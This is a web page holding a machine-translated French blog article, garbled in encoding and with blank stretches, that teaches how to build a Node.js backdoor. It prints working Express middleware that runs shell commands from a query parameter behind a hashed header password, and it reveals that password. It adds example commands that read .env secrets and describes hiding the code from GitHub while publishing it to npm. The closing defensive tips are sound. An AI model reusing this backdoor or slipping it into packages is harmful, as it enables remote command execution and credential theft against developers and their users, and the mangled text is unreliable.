<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë∏üèæ üë©üèª‚Äçüîß üíô Connaissez votre ennemi: cr√©ez une porte d√©rob√©e Node.js üíáüèª üêê üå¶Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Une porte d√©rob√©e dans son propre code, qui peut interagir de mani√®re transparente avec le syst√®me d'exploitation, est l'un des pires cauchemars de to...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Connaissez votre ennemi: cr√©ez une porte d√©rob√©e Node.js</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/493706/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Une porte d√©rob√©e dans son propre code, qui peut interagir de mani√®re transparente avec le syst√®me d'exploitation, est l'un des pires cauchemars de tout d√©veloppeur. </font><font style="vertical-align: inherit;">Actuellement, npm compte plus de 1,2 million de packages publics. </font><font style="vertical-align: inherit;">Au cours des trois derni√®res ann√©es, la d√©pendance aux projets est devenue une cible id√©ale pour les cybercriminels. </font><font style="vertical-align: inherit;">L'√©cosyst√®me npm peut √™tre √©tonnamment fragile si la communaut√© du d√©veloppement ne porte pas une attention particuli√®re √† la s√©curit√©. </font><font style="vertical-align: inherit;">Comme preuve de cette id√©e, il suffit de rappeler le </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">typosquattage</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> et l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">incident</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> avec le package npm de flux d'√©v√©nements. </font><font style="vertical-align: inherit;">
L'auteur de l'article, dont nous publions la traduction aujourd'hui, souhaite, √† des fins p√©dagogiques, expliquer comment cr√©er des portes d√©rob√©es pour la plateforme Node.js.</font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/webt/3j/8a/0y/3j8a0ysn9-nbui6_stqwb783zcq.jpeg"></a><br>
<br><font style="vertical-align: inherit;"></font><br>
<a name="habracut"></a><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Qu'est-ce qu'une porte d√©rob√©e?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voici la d√©finition de ¬´porte d√©rob√©e¬ª donn√©e sur la ressource </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Malwarebytes</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> : ¬´Dans le domaine de la cybers√©curit√©, une porte d√©rob√©e est toute m√©thode par laquelle les utilisateurs autoris√©s et non autoris√©s peuvent contourner les mesures de s√©curit√© communes et obtenir un acc√®s racine de haut niveau √† un syst√®me informatique, application r√©seau. </font><font style="vertical-align: inherit;">Apr√®s avoir obtenu un tel acc√®s au syst√®me, les cybercriminels peuvent utiliser une porte d√©rob√©e pour voler des donn√©es personnelles et financi√®res, installer des logiciels malveillants suppl√©mentaires et pirater des appareils. ¬ª </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La porte d√©rob√©e se compose de deux parties principales:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code malveillant int√©gr√© et ex√©cut√© sur un syst√®me attaqu√©</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un canal de communication ouvert qui permet √† un attaquant d'envoyer des commandes √† une porte d√©rob√©e et de contr√¥ler un ordinateur distant.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La porte d√©rob√©e install√©e sur l'ordinateur re√ßoit des commandes en r√©ponse auxquelles elle effectue certaines actions. Il peut s'agir de commandes visant √† extraire des informations pr√©cieuses du syst√®me, telles que des variables d'environnement, ou con√ßues pour effectuer une attaque sur la base de donn√©es. De plus, l'ex√©cution de ces commandes peut entra√Æner une modification d'autres processus affectant un seul ordinateur ou l'ensemble du r√©seau. L'ampleur de l'attaque d√©pend des autorisations dont dispose l'application infect√©e. Dans notre cas, nous parlons d'une application √©crite pour la plateforme Node.js. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Afin de cr√©er une version simplifi√©e du programme qui impl√©mente l'attaque ci-dessus, nous utiliserons le module standard </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">child_process</font></a><font style="vertical-align: inherit;"> pour ex√©cuter le code</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Pour √©tablir la communication avec la porte d√©rob√©e, nous utilisons un serveur HTTP. </font><font style="vertical-align: inherit;">Je vous conseille d'utiliser le framework Express dans ce cas, qui est connu pour ses √©normes capacit√©s, mais ce qui sera discut√© peut √™tre impl√©ment√© √† l'aide de tout autre outil appropri√©.</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pourquoi avons-nous besoin de child_process?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le module Node.js standard </font></font><code>child_process</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">peut √™tre utilis√© pour d√©marrer des processus enfants. </font><font style="vertical-align: inherit;">L'id√©e principale ici est qu'elle nous donne la possibilit√© d'ex√©cuter des commandes (entrant dans le processus via un flux d'entr√©e standard - </font></font><code>stdin</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) comme </font></font><code>pwd</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ou </font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, puis d'int√©grer le r√©sultat de ces commandes (la sortie provient du flux de sortie - </font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) et d'√©ventuels messages d'erreur (de stream </font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) au programme principal.</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/e3c/666/71e/e3c66671ef56b974c1a7692f7962c479.png"></div><br>
<i><font color="#999999"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ex√©cution de processus et sa relation avec les flux d'entr√©e, de sortie et d'erreur standard, qui jouent le r√¥le de flux d'entr√©e et de sortie pour un processus syst√®me en cours d'ex√©cution.</font></font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Il existe diff√©rentes mani√®res d'ex√©cuter des processus enfants. </font><font style="vertical-align: inherit;">Pour cette attaque, il est plus facile d'utiliser une fonction</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">qui vous permet de rappeler et de mettre dans les tampons appropri√©s ce qui entre dans les flux</font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">et</font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Par exemple, ce qui sera √©mis √† la suite de la commande</font></font><code>cat passwords.txt</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Veuillez noter qu'une fonction</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">n'est pas la meilleure fa√ßon d'effectuer de longues t√¢ches comme</font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span>&nbsp; {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);<font></font>
<font></font>
exec(<span class="hljs-string">'cat .env'</span>, (err, stdout, stderr) =&gt; {
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">throw</span> err
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(stderr) <span class="hljs-keyword">return</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Execution error: <span class="hljs-subst">${stderr}</span>`</span>)
&nbsp;&nbsp;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Env file content:&nbsp; <span class="hljs-subst">${stdout}</span>`</span>)<font></font>
})<font></font>
</code></pre><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Comment combiner la fonction exec avec le serveur HTTP?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai d√©velopp√© un progiciel middleware de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">redirection de navigateur</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> simple et d'apparence innocente </font><font style="vertical-align: inherit;">pour les applications Express. </font><font style="vertical-align: inherit;">Il redirige les utilisateurs non Chrome vers </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Browsehappy.com</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Je vais inclure du code malveillant dans ce package. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le code du package ressemblera √† ceci:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il suffit que la victime installe le package et l'utilise dans l'application Express de la m√™me mani√®re qu'elle utilise n'importe quel package de la couche interm√©diaire:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>);
<span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">"helmet"</span>)
<span class="hljs-keyword">const</span> browserRedirect = <span class="hljs-built_in">require</span>(<span class="hljs-string">"browser-redirect "</span>)<font></font>
&nbsp;<font></font>
<span class="hljs-keyword">const</span> app = express();<font></font>
&nbsp;<font></font>
app.use(browserRedirect())<font></font>
app.use(helmet())<font></font>
&nbsp;<font></font>
app.get(<span class="hljs-string">"/"</span>, (req, res)=&gt;{<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.send(<span class="hljs-string">"Hello Chrome User!"</span>)<font></font>
})<font></font>
&nbsp;<font></font>
app.listen(<span class="hljs-number">8080</span>)
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veuillez noter que dans ce cas, m√™me s'il est utilis√© </font></font><code>Helmet</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, cela ne prot√®ge pas l'application contre les attaques.</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Code malicieux</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'impl√©mentation du code malveillant est assez simple:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>)
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
<span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
&nbsp;<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> {cmd} = req.query;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> hash = crypto.createHash(<span class="hljs-string">'md5'</span>)<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.update(<span class="hljs-built_in">String</span>(req.headers[<span class="hljs-string">"knock_knock"</span>]))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.digest(<span class="hljs-string">"hex"</span>);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.setHeader(<span class="hljs-string">"Content-Sec-Policy"</span>, <span class="hljs-string">"default-src 'self'"</span>)
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>(cmd &amp;&amp; hash === <span class="hljs-string">"c4fbb68607bcbb25407e0362dab0b2ea"</span>) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> exec(cmd, (err, stdout, stderr)=&gt;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> res.send(<span class="hljs-built_in">JSON</span>.stringify({err, stdout, stderr}, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;})<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;}<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comment fonctionne notre porte d√©rob√©e? </font><font style="vertical-align: inherit;">Pour r√©pondre √† cette question, tenez compte des √©l√©ments suivants:</font></font><br>
<br>
<ol>
<li>,           .         .      md5- ( <code>p@ssw0rd1234</code>   <code>c4fbb68607bcbb25407e0362dab0b2ea</code>).           <code>knock_knock</code>. ,   ,  ,      .</li>
<li>,          .       ,     .        <code>Content-Sec-Policy</code>,      <code>Content-security-policy</code>.   ‚Äî      .     .       Shodan,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="></a>: <code>/search?query=Content-Sec-Policy%3A+default-src+%27self%27</code>.</li>
<li>  <code>?cmd</code>         .         .       <code>victim.com/?cmd=whoami</code>  <code>?cmd=cat .env</code>        JSON.</li>
</ol><br>
<h2><font color="#3AC1EF">  </font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant que le code de porte d√©rob√©e est pr√™t, vous devez r√©fl√©chir √† la fa√ßon de distribuer le package malveillant. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La premi√®re √©tape consiste √† publier le package. J'ai publi√© le package </font></font><code>browser-redirect@1.0.2</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dans npm. Mais si vous regardez le r√©f√©rentiel GitHub du projet, le code malveillant ne sera pas l√†. Voyez par vous-m√™me - jetez un ≈ìil √† la branche de projet </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ma√Ætre</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> et √† la version </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.0.2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Cela est possible du fait que npm ne v√©rifie pas le code des packages publi√©s avec le code publi√© dans un syst√®me con√ßu pour fonctionner avec le code source. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bien que le package soit publi√© en npm, ses chances de distribution sont encore tr√®s faibles, car les victimes potentielles doivent toujours le trouver et l'installer.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Une autre fa√ßon de distribuer un package consiste √† ajouter un module malveillant en tant que d√©pendance pour d'autres packages. Si un attaquant a acc√®s √† un compte disposant des droits de publication d'un package important, il peut publier une nouvelle version d'un tel package. Les d√©pendances de la nouvelle version du package comprendront √©galement une porte d√©rob√©e. En cons√©quence, nous parlons de l'inclusion directe d'un package malveillant dans les d√©pendances d'un projet populaire (jetez un ≈ìil √† l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">analyse de l'</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> incident qui s'est produit avec le flux d'√©v√©nements). Alternativement, un attaquant peut essayer de faire des relations publiques dans un projet en apportant les modifications appropri√©es au fichier de verrouillage. Lisez √† ce sujet </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Un autre facteur important qui doit √™tre pris en compte est de savoir si l'attaquant a acc√®s aux informations d'identification (nom d'utilisateur et mot de passe) d'une personne qui soutient un certain projet populaire. Si un attaquant poss√®de de telles donn√©es, il peut facilement publier une nouvelle version du package - comme cela s'est produit avec </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eslint</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais m√™me si quelqu'un qui prend en charge le projet utilise l'authentification √† deux facteurs pour le publier, il le risque toujours. Et lorsqu'un syst√®me d'int√©gration continue est utilis√© pour d√©ployer de nouvelles versions du projet, l'authentification √† deux facteurs doit √™tre d√©sactiv√©e. Par cons√©quent, si un attaquant peut voler un jeton npm de travail pour un syst√®me d'int√©gration continue (par exemple, √† partir de journaux rendus accidentellement publics, de fuites de donn√©es et d'autres sources similaires), il pourra alors d√©ployer de nouvelles versions contenant du code malveillant. . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Veuillez noter que la </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">nouvelle API a</font></a><font style="vertical-align: inherit;"> √©t√© publi√©e </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(toujours en version b√™ta priv√©e), qui vous permet de savoir si le package a √©t√© publi√© √† l'aide de l'adresse IP du r√©seau TOR et si l'authentification √† deux facteurs a √©t√© utilis√©e lors de la publication. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De plus, les attaquants peuvent configurer le code malveillant afin qu'il s'ex√©cute sous la forme d'un script qui s'ex√©cute avant l'installation ou apr√®s l'installation de tout package npm. Il existe </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">des hooks de</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cycle de vie </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">standard pour les</font></a><font style="vertical-align: inherit;"> packages npm qui vous permettent d'ex√©cuter du code sur l'ordinateur d'un utilisateur √† un moment pr√©cis. Par exemple, un syst√®me d'organisation des projets de test dans un navigateur, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puppeteer</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , utilise ces hooks pour </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">installer</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Chromium sur un syst√®me h√¥te. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ryan Dahl a d√©j√† </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dit</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">√† propos de ces vuln√©rabilit√©s lors de JSConf EU 2018. La plate-forme Node.js a besoin d'un niveau de protection plus √©lev√© pour emp√™cher cela et d'autres vecteurs d'attaque. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voici quelques conclusions de l' </font><font style="vertical-align: inherit;">√©tude de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s√©curit√© des</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> logiciels open source:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78% des vuln√©rabilit√©s se trouvent dans des d√©pendances indirectes, ce qui complique le processus de suppression de ces vuln√©rabilit√©s.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">En 2 ans, les vuln√©rabilit√©s des biblioth√®ques ont augment√© de 88%.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81% des r√©pondants pensent que les d√©veloppeurs eux-m√™mes devraient √™tre responsables de la s√©curit√©. </font><font style="vertical-align: inherit;">Ils estiment en outre que les d√©veloppeurs ne sont pas bien pr√©par√©s √† cela.</font></font></li>
</ul><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">R√©sultats: comment se prot√©ger des portes d√©rob√©es?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le contr√¥le des d√©pendances n'est pas toujours facile, mais quelques conseils peuvent vous y aider:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilisez des biblioth√®ques bien connues et bien prises en charge.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Impliquez-vous dans la vie communautaire et aidez ceux qui soutiennent les biblioth√®ques. </font><font style="vertical-align: inherit;">L'aide peut comprendre l'√©criture de code ou un soutien financier pour des projets.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilisez </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NQP</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour analyser les nouvelles d√©pendances de votre projet.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Utilisez Snyk pour vous tenir au courant des vuln√©rabilit√©s et surveiller vos projets.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Analysez le code des d√©pendances que vous utilisez, stock√© dans npm. </font><font style="vertical-align: inherit;">Ne vous limitez pas √† afficher le code de GitHub ou d'autres syst√®mes similaires.</font></font></li>
</ul><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Chers lecteurs! </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Comment prot√©gez-vous vos projets en utilisant le code de quelqu'un d'autre?</font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/webt/iq/fi/b4/iqfib45pgphfrxv--zfemt0qnmw.jpeg"></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr493692/index.html">Structures de donn√©es th√©oriques et leur application en JavaScript. P1. Des couples</a></li>
<li><a href="../fr493696/index.html">Acc√©l√©ration du sous-syst√®me de disque Kemu Qemu sous Linux</a></li>
<li><a href="../fr493700/index.html">Utilisation de logiciels malveillants dans Azure pour acc√©der aux locataires Microsoft 365</a></li>
<li><a href="../fr493702/index.html">Transition massive vers le travail √† distance: probl√®mes techniques et menaces pour la s√©curit√©</a></li>
